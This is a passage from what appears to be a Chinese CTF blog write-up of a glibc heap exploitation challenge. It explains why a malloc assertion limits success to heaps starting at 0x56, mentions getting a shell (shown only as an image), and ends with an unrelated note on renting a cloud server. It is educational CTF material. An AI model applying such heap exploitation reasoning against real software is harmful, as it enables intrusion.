+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200302231248.png"></p>
+<p>汇编如下：</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200303023929.png"></p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200303024022.png"></p>
+<p>源码如下：</p>
+<pre><code>mem = _int_malloc (av, sz);
+assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||
+          av == arena_for_chunk (mem2chunk (mem)));</code></pre>
+<p>以上3个条件必须有一个满足才行。</p>
+<pre><code>#define arena_for_chunk(ptr) \
+  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</code></pre>
+<p>因为0x55和0x56的都有NON_MAIN_ARENA(0x4)位，而返回的chunk又不在arena的堆空间里，所以第3个条件是不能满足的。那么只有满足第2个了，chunk的mmap标志位置位，也就是只有<code>heap address start with 0x56</code>的情况下才行。否则assert失败，程序退出。</p>
+<p>参考链接<a target="_blank" rel="noopener" href="https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md">https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md</a></p>
+<p>getshell</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200303020831.png"></p>
+<h5 id="迷惑"><a href="#迷惑" class="headerlink" title="迷惑"></a>迷惑</h5><p>我很迷惑为什么2.23会报这个错呢？明明没这行代码的。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200301233055.png"></p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200301233250.png"></p>
+<h5 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h5><p>在unsortedbin里找块的时候找大小相等的，相等就return，剩下的还待在unsortedbin里。</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>今天想自己搭一个那啥。</p>
+<p><a target="_blank" rel="noopener" href="https://233v2.com/post/16/">https://233v2.com/post/16/</a></p>
+<p>vultr的ip很容易被ban不知道为什么，然后换了谷歌云，上来就给了两千多。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200229112905.png"></p>
+<p>一开始还以为是刀乐，结果其实是港币。港币那也是白给:P</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/94DC0CFABEA2B3402006DE074A8F21D8.jpg"></p>
+<p>好像最多开12个CPU，开心了。</p>
+<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200229112746.png"></p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/rr/" title="调试工具rr"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: 调试工具rr</span></a><a class="button is-default" href="/vmPwn/" title="vm Pwn题目小结"><span class="has-text-weight-semibold">Next: vm Pwn题目小结</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Q1IQ/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Q1IQ"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><a title="rss" target="_blank" rel="noopener nofollow" href="/atom.xml"><i class="iconfont icon-rss"></i></a><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> Q1IQ 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
